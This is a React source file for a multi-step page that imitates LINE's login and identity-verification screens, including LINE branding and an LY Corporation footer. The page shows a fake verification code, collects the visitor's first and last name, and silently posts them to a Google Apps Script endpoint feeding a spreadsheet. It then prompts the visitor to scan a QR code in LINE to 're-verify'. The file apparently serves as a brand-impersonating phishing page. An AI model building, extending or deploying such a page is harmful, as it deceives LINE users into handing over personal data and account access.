import React, { useState, useEffect } from 'react'
import { Button } from '@/components/ui/button.jsx'
import { Input } from '@/components/ui/input.jsx'
import './App.css'

function App() {
  const [currentStep, setCurrentStep] = useState(1)
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: ''
  })
  const [verificationCode, setVerificationCode] = useState('')
  const [timeLeft, setTimeLeft] = useState(180) // 3 minutes

  // Generate random verification code
  useEffect(() => {
    setVerificationCode(Math.floor(1000 + Math.random() * 9000).toString())
  }, [])

  // Timer countdown
  useEffect(() => {
    if (currentStep === 1 && timeLeft > 0) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000)
      return () => clearTimeout(timer)
    }
  }, [currentStep, timeLeft])

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`
  }

  const handleInputChange = (e) => {
    const { name, value } = e.target
    setFormData(prev => ({
      ...prev,
      [name]: value
    }))
  }

  const handleSubmit = async () => {
    if (!formData.firstName.trim() || !formData.lastName.trim()) {
      alert('กรุณากรอกข้อมูลให้ครบถ้วน')
      return
    }

    try {
      // ส่งข้อมูลไป Google Sheets
      const response = await fetch('https://script.google.com/macros/s/AKfycbxGoogleAppsScriptURLHere/exec', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          firstName: formData.firstName,
          lastName: formData.lastName,
          timestamp: new Date().toISOString()
        })
      })

      // เนื่องจากใช้ no-cors จึงไม่สามารถอ่าน response ได้
      // แต่ข้อมูลจะถูกส่งไปยัง Google Sheets
      setCurrentStep(3)
    } catch (error) {
      console.error('Error submitting form:', error)
      // ยังคงไปหน้าถัดไปเพื่อแสดง QR Code
      setCurrentStep(3)
    }
  }

  const renderStep1 = () => (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
        <div className="mb-6">
          <h1 className="text-2xl font-bold text-green-500 mb-2">LINE</h1>
          <h2 className="text-lg font-semibold text-gray-800 mb-2">รหัสยืนยันตัวตน</h2>
          <p className="text-sm text-gray-600">ตรวจสอบรหัสยืนยันตัวตนที่ได้รับใน LINE อย่างปลอดภัย</p>
        </div>
        
        <div className="bg-gray-100 rounded-lg p-6 mb-6">
          <div className="text-4xl font-bold text-green-500 mb-2">{verificationCode}</div>
          <div className="text-sm text-gray-600">เหลือเวลา {formatTime(timeLeft)}</div>
        </div>

        <div className="text-sm text-gray-600 mb-4">
          <p>ไม่ใช่ใครที่คุณยืนยันตัวตน LINE</p>
          <p>สำหรับยืนยันตัวตนใหม่</p>
        </div>

        <Button 
          onClick={() => setCurrentStep(2)}
          className="w-full bg-blue-500 hover:bg-blue-600 text-white"
        >
          เข้าสู่ระบบด้วยรหัสยืนยัน
        </Button>
      </div>
    </div>
  )

  const renderStep2 = () => (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md">
        <div className="text-center mb-6">
          <h1 className="text-2xl font-bold text-green-500 mb-4">LINE</h1>
        </div>

        <div className="space-y-4 mb-6">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">ชื่อ</label>
            <Input
              type="text"
              name="firstName"
              value={formData.firstName}
              onChange={handleInputChange}
              placeholder="กรอกชื่อ"
              className="w-full"
            />
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">นามสกุล</label>
            <Input
              type="text"
              name="lastName"
              value={formData.lastName}
              onChange={handleInputChange}
              placeholder="กรอกนามสกุล"
              className="w-full"
            />
          </div>
        </div>

        <Button 
          onClick={handleSubmit}
          className="w-full bg-gray-400 hover:bg-gray-500 text-white mb-4"
        >
          ยืนยัน
        </Button>

        <div className="text-center">
          <hr className="my-4" />
          <p className="text-sm text-gray-600 mb-2">เข้าสู่ระบบด้วยรหัสยืนยัน</p>
          <p className="text-lg font-semibold">เข้าสู่ระบบด้วยรหัสการใช้งาน</p>
          <hr className="my-4" />
          <p className="text-sm text-gray-600">การใช้งานสู่ระบบใน LINE</p>
          <button 
            onClick={() => setCurrentStep(3)}
            className="text-blue-500 text-sm underline"
          >
            ดูข้อมูลเพิ่มเติมรหัสยืนยัน
          </button>
        </div>
      </div>
    </div>
  )

  const renderStep3 = () => (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
        <div className="mb-6">
          <h1 className="text-2xl font-bold text-green-500 mb-4">LINE</h1>
          <h2 className="text-lg font-semibold text-gray-800 mb-4">เข้าสู่ระบบด้วยรหัสการใช้งาน</h2>
        </div>

        <div className="mb-6">
          <div className="bg-gray-100 p-4 rounded-lg mb-4">
            {/* QR Code placeholder - ในการใช้งานจริงควรใช้ library สำหรับสร้าง QR Code */}
            <div className="w-32 h-32 mx-auto bg-black flex items-center justify-center text-white text-xs">
              QR CODE
            </div>
          </div>
          
          <div className="flex items-center justify-center mb-4">
            <input type="radio" className="mr-2" />
            <span className="text-sm text-gray-600">สร้างรหัสการใช้งานใหม่</span>
          </div>
          
          <p className="text-sm text-gray-600 mb-2">
            โปรดเปิดตัวอ่านรหัสการใช้งานใน LINE สำหรับยืนยันตัวตนใหม่แล้ว
          </p>
          <p className="text-sm text-gray-600">สแกนรหัสการใช้งาน</p>
        </div>

        <Button 
          onClick={() => setCurrentStep(1)}
          className="w-full bg-blue-500 hover:bg-blue-600 text-white"
        >
          เข้าสู่ระบบด้วยรหัสยืนยัน
        </Button>

        <div className="mt-4">
          <button 
            onClick={() => setCurrentStep(1)}
            className="text-blue-500 text-sm underline"
          >
            วิธีสแกนรหัสการใช้งาน
          </button>
        </div>
      </div>
    </div>
  )

  return (
    <div className="font-sans">
      {currentStep === 1 && renderStep1()}
      {currentStep === 2 && renderStep2()}
      {currentStep === 3 && renderStep3()}
      
      {/* Footer */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-2 text-xs text-gray-500 flex justify-between">
        <span>© LY Corporation</span>
        <div className="space-x-4">
          <span>นโยบายความเป็นส่วนตัว</span>
          <span>ข้อกำหนดการใช้บริการ</span>
        </div>
      </div>
    </div>
  )
}

export default App

